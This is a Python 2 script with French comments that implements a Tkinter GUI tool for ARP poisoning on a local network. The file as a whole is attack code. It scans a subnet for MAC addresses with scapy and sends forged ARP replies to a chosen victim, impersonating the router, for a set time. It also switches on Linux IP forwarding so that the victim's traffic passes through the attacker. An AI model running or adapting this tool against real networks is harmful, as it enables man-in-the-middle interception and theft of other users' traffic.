#coding: utf8
#Script d'ARPPoisonning
#Auteur:Benjamin CAILLARD

from Tkinter import *
from scapy.all import *
import socket,os,time,threading
V_endspoof = ""
intfce = "eth0"

#Definition d'une classe pour l'interface
class C_GUI(Frame):
	#Lancement des commandes d'ARPPoisonning
	def cmmdstp(self):
		self.endwhl = "END"
	def cmmdkillall(self):
		adrsip = 1
		V_nbaddrs = 0
		macvtcs = []
		macvtcs.append(0)
		self.lstscn.insert(END,"MyList")
		while adrsip < 10:
			tmp = Macaddr(self.kall.get()+str(adrsip))
			adrsip +=1
			print str(tmp)
			if tmp != "None":
				macvtcs[0] +=1
				macvtcs.append(str(tmp))
				
		for inserlb in macvtcs:
			self.lstscn.insert(END, inserlb)
	def cmmd(self):
		self.endwhl = "NOTEND"
		self.disp.set("Check en cours du routeur "+str(Macaddr(self.rtr.get())))
		self.disp.set("Check en cours de la victime "+str(Macaddr(self.vtc.get())))
		V_macvtc = Macaddr(self.vtc.get())
		V_timer = timerspoof(self.date.get())
		F_ipforw(self.rdbvar.get())
		T_thread = C_thread()
		T_thread.F_Go(V_timer[0],V_timer[1],self.vtc.get(),self.rtr.get(),V_macvtc,self).start()
	#definition de l'interface et des widgets
	def __init__(self,G_main, **kwargs):
		Frame.__init__(self, G_main, **kwargs)	
		self.pack(fill=BOTH)	
		self.test = ""
		#Form1
		self.lbldesc = Label(self, text="Logiciel d'ARPPoisonning, crée par Benjamin CAILLARD").grid(row=0,column=2,columnspan=5)
		self.lbl0 = Label(self, text="########################").grid(row=1,column=0,columnspan=2)
		self.lbldparam = Label(self, text="Paramètres:").grid(row=2,column=0,columnspan=2)
		self.lbl1 = Label(self, text="########################").grid(row=3,column=0,columnspan=2)
		self.lblrtr = Label(self, text="IP du routeur").grid(row=4,column=0,columnspan=2)
		self.rtr = StringVar()	
		self.inprtr = Entry(self, textvariable=self.rtr,width=30).grid(row=5,column=0,columnspan=2)
		self.lbl2 = Label(self, text="########################").grid(row=6,column=0,columnspan=2)
		self.lblvct = Label(self, text="IP de la victime").grid(row=7,column=0,columnspan=2)	
		self.vtc = StringVar()		
		self.inpvtc = Entry(self,textvariable=self.vtc ,width=30).grid(row=8,column=0,columnspan=2)
		self.lbl5 = Label(self, text="########################").grid(row=9,column=0,columnspan=2)
		self.lbl7 = Label(self, text="Durée(0 infini)").grid(row=10,column=0,columnspan=2)
		self.date = IntVar()			
		self.inpdate = Entry(self, textvariable=self.date,width=30).grid(row=11,column=0,columnspan=2)
		self.lbl5 = Label(self, text="########################").grid(row=12,column=0,columnspan=2)
		self.lbl6 = Label(self, text="Activation IPForwarding").grid(row=13,column=0,columnspan=2)
		self.rdbvar = StringVar()
		Radiobutton(self, text="Activer", variable=self.rdbvar, value="y").grid(row=14,column=0,columnspan=2)
		Radiobutton(self, text="Désactiver", variable=self.rdbvar, value="n").grid(row=15,column=0,columnspan=2)
		self.lbl3 = Label(self, text="|").grid(row=16,column=0,columnspan=2)
		self.lbl4 = Label(self, text="\/").grid(row=17,column=0,columnspan=2)
		#print self.test.get()
		self.btncheck = Button(self, text='Lancer',command=self.cmmd).grid(row=18,column=0)
		self.btnstp = Button(self, text='Stop',command=self.cmmdstp).grid(row=18,column=1)
		self.disp = StringVar()			
		self.inpdisp = Entry(self, textvariable=self.disp,width=30).grid(row=19,column=0,columnspan=2)
		#Form2
		self.lbl4 = Label(self, text="Adresse réseau local").grid(row=2,column=3,columnspan=2)
		self.kall = StringVar()
		self.inpkall = Entry(self, textvariable=self.kall,width=30).grid(row=3,column=3,columnspan=2)
		self.kall.set("10.0.0.[laissez vide]")
		self.btnkall = Button(self, text='Scan',command=self.cmmdkillall).grid(row=4,column=3,columnspan=2)
		self.lstscn = Listbox(self, selectmode=EXTENDED).grid(row=5,column=3,rowspan=9,columnspan=2)
#Class Threading
class C_thread(threading.Thread):
	def __init__(self):
        	threading.Thread.__init__(self)
	def F_Go(self,timer,timerend,V_targ,V_gateway,Mac_targ,self2):
		while timer < timerend and self2.endwhl != "END":
			#respreq =  threading.Thread(arpreq(V_targ,V_gateway,Mac_targ)).start()
			respreq = arpreq(V_targ,V_gateway,Mac_targ)
			self2.disp.set("Usurpation sur "+ V_targ)
			timer = time.time()
		F_ipforw("n")

#Parametres generaux de l'interface
def F_genmain(G_):
		G_main.title("Arspoy")
		G_main.geometry('600x400')
#Recuperation de l'adresse MAC de X
def Macaddr(ip):
	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=0)
	for s,r in ans:
		return r.sprintf("%Ether.src%")
#Requete d'arp poisonning
def arpreq(victim,usurp,mac):
	respreq = send(ARP(op=2, pdst=victim, psrc=usurp, hwdst=mac))
	return respreq
def timerspoof(date):
	timer = time.time()
	timerend = time.time()+int(date)
	return timer,timerend
#Requete d'IPForwarding sur Linux
def F_ipforw(check):
	if check == "" or check == "y":
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	elif check == "n":
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	else:
		print "Commande invalide"
#Boucle de requete arp

	

G_main = Tk()
F_genmain(G_main)
GUI = C_GUI(G_main)

GUI.mainloop()

